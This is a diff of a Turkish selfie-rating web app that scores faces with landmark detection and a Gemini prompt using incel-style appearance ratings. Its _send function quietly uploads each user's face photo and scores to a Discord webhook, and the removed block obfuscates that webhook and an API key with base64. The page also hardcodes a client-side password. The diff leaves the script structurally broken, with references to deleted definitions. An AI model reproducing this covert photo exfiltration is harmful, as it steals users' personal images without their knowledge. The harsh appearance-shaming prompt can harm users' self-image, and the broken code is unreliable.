@@ -115,7 +115,7 @@
         .badge.over { border-color: #ff0000; color: #ff0000; }
         .metric-bars { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
         .metric-bar {
-            flex: 1; min-width: 45%; background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px;
+            flex: 1; min-width: 30%; background: rgba(0,0,0,0.5); border-radius: 10px; padding: 10px;
             border: 1px solid rgba(255,255,255,0.03);
         }
         .metric-bar .metric-label { font-size: 9px; letter-spacing: 1px; color: #666; margin-bottom: 6px; text-align: center; }
@@ -169,7 +169,7 @@
                 </div>
                 <button class="btn btn-primary" id="btnLogin">GİRİŞ</button>
                 <div class="error-box" id="loginError"></div>
-                <footer>v31.0 • Hybrid Engine</footer>
+                <footer>v32.0 • FINAL</footer>
             </div>
         </div>
 
@@ -212,185 +212,7 @@
                 </div>
             </div>
         </div>
-    </div><script>
-    const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
-    let faceApiReady = false;
-
-    async function loadFaceApi() {
-        try {
-            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-            await faceapi.nets.faceLandmark68TinyNet.loadFromUri(MODEL_URL);
-            faceApiReady = true;
-        } catch(e) {}
-    }
-    loadFaceApi();
-
-    const GK = atob("QVEuQWI4Uk42SklHVDYxZlBZR2c1TmtJN1JiekF2d3ROVlVtYVFQSm5oWWM1emF0SmVnTlE=");
-    const WH = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMTAwNjg0ODM5NDU5NjQyNC9tOHU5a1NXY0R5TkxfUzhYVkhfRW13bFdVUERhdFBydG1MR00td0JLckk1UnRjekY3UzAwSVAzU05SaDV5c0xmdGRR");
-    const API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent";
-    
-    let base64Image = "", currentMimeType = "image/jpeg", faceData = null;
-    const MAX_SIZE_MB = 8;
-    const pageLogin = document.getElementById('pageLogin');
-    const pageAnalyze = document.getElementById('pageAnalyze');
-
-    function showPage(p) { pageLogin.classList.remove('active'); pageAnalyze.classList.remove('active'); p.classList.add('active'); }
-
-    window.addEventListener('DOMContentLoaded', () => {
-        if (localStorage.getItem('_x') === '1') showPage(pageAnalyze);
-    });
-
-    document.getElementById('btnLogin').addEventListener('click', () => {
-        if (document.getElementById('passwordInput').value.trim() !== '25maxapp') {
-            document.getElementById('loginError').textContent = '⚠️ Hatalı şifre!';
-            document.getElementById('loginError').style.display = 'block'; return;
-        }
-        localStorage.setItem('_x', '1');
-        document.getElementById('passwordInput').value = '';
-        document.getElementById('loginError').style.display = 'none';
-        showPage(pageAnalyze);
-    });
-    document.getElementById('passwordInput').addEventListener('keypress', e => { if(e.key==='Enter') document.getElementById('btnLogin').click(); });
-    document.getElementById('btnLogout').addEventListener('click', () => {
-        localStorage.removeItem('_x'); resetUpload();
-        document.getElementById('resultContainer').style.display = 'none';
-        document.getElementById('analyzeError').style.display = 'none';
-        showPage(pageLogin);
-    });
-
-    document.getElementById('galleryInput').addEventListener('change', e => handleFile(e.target.files[0]));
-    document.getElementById('cameraInput').addEventListener('change', e => handleFile(e.target.files[0]));
-
-    async function handleFile(file) {
-        document.getElementById('analyzeError').style.display = 'none';
-        document.getElementById('resultContainer').style.display = 'none';
-        document.getElementById('scannerOverlay').style.display = 'none';
-        document.getElementById('progressWrap').style.display = 'none';
-        faceData = null;
-        if(!file){resetUpload();return;}
-        if(!file.type.startsWith('image/')){showErr("Geçersiz dosya!");resetUpload();return;}
-        if(file.size>MAX_SIZE_MB*1024*1024){showErr(`Max ${MAX_SIZE_MB}MB!`);resetUpload();return;}
-        currentMimeType=file.type;
-        const r=new FileReader();
-        r.onload=async e=>{
-            const img=new Image();
-            img.onload=async ()=>{
-                if(img.width<80||img.height<80){showErr("Çok küçük!");resetUpload();return;}
-                document.getElementById('preview').src=e.target.result;
-                document.getElementById('previewWrapper').classList.add('active');
-                base64Image=e.target.result.split(',')[1]||"";
-                
-                if(faceApiReady){
-                    try{
-                        const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
-                        if(detections.length>0){
-                            const canvas = document.getElementById('faceCanvas');
-                            canvas.width = img.width;
-                            canvas.height = img.height;
-                            canvas.style.display = 'block';
-                            
-                            const ctx = canvas.getContext('2d');
-                            ctx.clearRect(0,0,canvas.width,canvas.height);
-                            
-                            const landmarks = detections[0].landmarks;
-                            
-                            // Tüm noktalar
-                            ctx.fillStyle = '#00ff41';
-                            landmarks.positions.forEach(p => {
-                                ctx.beginPath(); ctx.arc(p.x, p.y, 1.5, 0, 2*Math.PI); ctx.fill();
-                            });
-                            
-                            // Çene
-                            const jaw = landmarks.getJawOutline();
-                            ctx.strokeStyle = '#00ff41'; ctx.lineWidth = 1;
-                            ctx.beginPath(); ctx.moveTo(jaw[0].x, jaw[0].y);
-                            for(let i=1; i<jaw.length; i++) ctx.lineTo(jaw[i].x, jaw[i].y); ctx.stroke();
-                            
-                            // Gözler
-                            ctx.strokeStyle = '#00ccff';
-                            [landmarks.getLeftEye(), landmarks.getRightEye()].forEach(eye => {
-                                ctx.beginPath(); ctx.moveTo(eye[0].x, eye[0].y);
-                                for(let i=1; i<eye.length; i++) ctx.lineTo(eye[i].x, eye[i].y);
-                                ctx.closePath(); ctx.stroke();
-                            });
-                            
-                            // Kaşlar
-                            ctx.strokeStyle = '#ffcc00';
-                            [landmarks.getLeftEyeBrow(), landmarks.getRightEyeBrow()].forEach(brow => {
-                                ctx.beginPath(); ctx.moveTo(brow[0].x, brow[0].y);
-                                for(let i=1; i<brow.length; i++) ctx.lineTo(brow[i].x, brow[i].y); ctx.stroke();
-                            });
-                            
-                            // Burun
-                            ctx.strokeStyle = '#ff6600';
-                            const nose = landmarks.getNose();
-                            ctx.beginPath(); ctx.moveTo(nose[0].x, nose[0].y);
-                            for(let i=1; i<nose.length; i++) ctx.lineTo(nose[i].x, nose[i].y); ctx.stroke();
-                            
-                            // Dudak
-                            ctx.strokeStyle = '#ff00ff';
-                            const mouth = landmarks.getMouth();
-                            ctx.beginPath(); ctx.moveTo(mouth[0].x, mouth[0].y);
-                            for(let i=1; i<mouth.length; i++) ctx.lineTo(mouth[i].x, mouth[i].y);
-                            ctx.closePath(); ctx.stroke();
-                            
-                            // Metrikler
-                            const leftJaw = jaw.slice(0,8);
-                            const rightJaw = jaw.slice(9,17).reverse();
-                            let diff = 0;
-                            for(let i=0; i<leftJaw.length; i++) diff += Math.abs(leftJaw[i].y - rightJaw[i].y);
-                            
-                            const leftEye = landmarks.getLeftEye();
-                            const rightEye = landmarks.getRightEye();
-                            
-                            faceData = {
-                                symmetry: Math.max(0, 100-(diff/leftJaw.length)*10).toFixed(1),
-                                jawWidth: Math.abs(jaw[0].x - jaw[16].x).toFixed(0),
-                                faceHeight: Math.abs(jaw[8].y - landmarks.positions[27].y).toFixed(0),
-                                eyeDistance: Math.abs(leftEye[0].x - rightEye[3].x).toFixed(0),
-                                noseHeight: Math.abs(nose[0].y - nose[6].y).toFixed(0),
-                                mouthWidth: Math.abs(mouth[0].x - mouth[6].x).toFixed(0),
-                                totalPoints: landmarks.positions.length
-                            };
-                            
-                            const wrapper = document.getElementById('previewWrapper');
-                            const scale = wrapper.offsetWidth / img.width;
-                            canvas.style.width = wrapper.offsetWidth + 'px';
-                            canvas.style.height = (img.height * scale) + 'px';
-                        }
-                    }catch(e){}
-                }
-            };
-            img.src=e.target.result;
-        };
-        r.readAsDataURL(file);
-    }
-
-    function resetUpload() {
-        document.getElementById('galleryInput').value=""; document.getElementById('cameraInput').value="";
-        document.getElementById('previewWrapper').classList.remove('active'); document.getElementById('preview').src="";
-        document.getElementById('faceCanvas').style.display='none';
-        document.getElementById('progressWrap').style.display='none';
-        base64Image=""; currentMimeType="image/jpeg"; faceData=null;
-    }
-
-    function showErr(m) {
-        const b=document.getElementById('analyzeError'); b.textContent='⚠️ '+m; b.style.display='block';
-        setTimeout(()=>{b.style.display='none';},5000);
-    }
-
-    function startProgress() {
-        const w=document.getElementById('progressWrap'), f=document.getElementById('progressFill'), t=document.getElementById('progressText');
-        w.style.display='block'; let p=0;
-        const i=setInterval(()=>{
-            p+=Math.random()*2+0.3;
-            if(p>=88){p=88;clearInterval(i);
-                const si=setInterval(()=>{p+=0.2;if(p>=96){p=96;clearInterval(si);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},600);
-            }
-            f.style.width=p+'%'; t.textContent='%'+Math.floor(p);
-        },350);
-        return {complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},500);}};
-    }        const PROMPT = `Bu yüzü acımasızca değerlendir. KESİNLİKLE Türkçe cevap ver. Her satırı doldur:
+    </div>        const PROMPT = `Bu yüzü acımasızca değerlendir. KESİNLİKLE Türkçe cevap ver. Her satırı doldur:
 
 MOG:6.5
 PSL:6.0
@@ -399,8 +221,8 @@ APPEAL:6.2
 HARMONY:68
 DIMORPHISM:62
 ANGULARITY:55
-GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt,belirgin elmacık kemikleri,kalın kaşlar
-BAD:hafif UEE,asimetrik kaşlar,geniş burun tabanı,saç çizgisi gerilemesi,göz altı morlukları,yuvarlak yüz hatları
+GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt,belirgin elmacık kemikleri
+BAD:hafif UEE,asimetrik kaşlar,geniş burun tabanı,saç çizgisi gerilemesi,göz altı morlukları
 DETAIL:Ortalamanın üstünde bir yüz. Çene hattı güçlü ancak göz bölgesi zayıf. Daha iyi kaş desteği ile Chadlite seviyesine çıkabilir.
 
 Yukarıdaki örnek değerleri BU YÜZE göre güncelle. Tüm alanları Türkçe doldur.`;
@@ -504,14 +326,20 @@ Yukarıdaki örnek değerleri BU YÜZE göre güncelle. Tüm alanları Türkçe 
 
         async function _send(r){
             const wh=WH;
-            if(!wh||wh.length<30)return;
+            if(!wh||wh.length<50){console.log('Discord webhook geçersiz');return;}
+            console.log('📤 Discord gönderiliyor...');
+            
             let pu=null;
             if(base64Image){
-                const fd=new FormData();
-                const blob=await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
-                fd.append('file',blob,'face.'+(currentMimeType==='image/png'?'png':'jpg'));
-                try{const pr=await fetch(wh,{method:'POST',body:fd});const pd=await pr.json();pu=pd.attachments?.[0]?.url;}catch(e){console.log('Discord fotoğraf hatası:',e);}
+                try{
+                    const blob=await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
+                    const fd=new FormData();fd.append('file',blob,'face.'+(currentMimeType==='image/png'?'png':'jpg'));
+                    const pr=await fetch(wh,{method:'POST',body:fd});const pd=await pr.json();
+                    pu=pd.attachments?.[0]?.url;
+                    console.log('📸 Fotoğraf:',pu?'✅':'❌');
+                }catch(e){console.log('📸 Fotoğraf hatası:',e.message);}
             }
+            
             const emb={
                 title:'🔥 25 MAX ANALİZ',color:0x00ff41,
                 fields:[
@@ -521,10 +349,14 @@ Yukarıdaki örnek değerleri BU YÜZE göre güncelle. Tüm alanları Türkçe 
                     {name:'✅ EN İYİ',value:r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false},
                     {name:'❌ EN KÖTÜ',value:r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false}
                 ],
-                footer:{text:'25 Max App • Hybrid Engine'},timestamp:new Date().toISOString()
+                footer:{text:'25 Max App • Final'},timestamp:new Date().toISOString()
             };
             if(pu)emb.image={url:pu};
-            try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})});}catch(e){console.log('Discord embed hatası:',e);}
+            try{
+                const er=await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})});
+                if(er.ok){console.log('✅ Discord gönderildi');}
+                else{const ed=await er.json().catch(()=>({}));console.log('❌ Discord:',ed.message||er.status);}
+            }catch(e){console.log('❌ Discord bağlantı:',e.message);}
         }
     </script>
 </body>
